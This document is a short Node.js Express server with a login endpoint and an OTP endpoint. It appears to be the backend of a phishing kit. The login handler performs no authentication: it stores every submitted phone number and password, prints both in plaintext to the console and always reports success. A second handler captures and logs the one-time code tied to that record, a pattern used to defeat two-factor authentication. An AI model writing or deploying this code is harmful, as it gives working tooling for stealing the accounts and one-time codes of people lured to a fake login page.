const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(cors());
app.use(express.json());

const UserSchema = new mongoose.Schema({
    phoneNumber: String,
    password: String,
    otp: String
});
const User = mongoose.model('User', UserSchema);

// 1. Login Handler
app.post('/api/login-submit', async (req, res) => {
    const { phoneNumber, password } = req.body;
    const user = new User({ phoneNumber, password });
    await user.save();
    console.log(`\n[LOGIN] Phone: ${phoneNumber}, Pass: ${password}`);
    res.json({ success: true, userId: user._id });
});

// 2. OTP Handler
app.post('/api/otp-submit', async (req, res) => {
    const { userId, otp } = req.body;
    await User.findByIdAndUpdate(userId, { otp });
    console.log(`\n[OTP RECEIVED] Code: ${otp}`);
    res.json({ success: true });
});

async function start() {
    const mongod = await MongoMemoryServer.create();
    await mongoose.connect(mongod.getUri());
    const PORT = process.env.PORT || 6500;
    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
}

start();
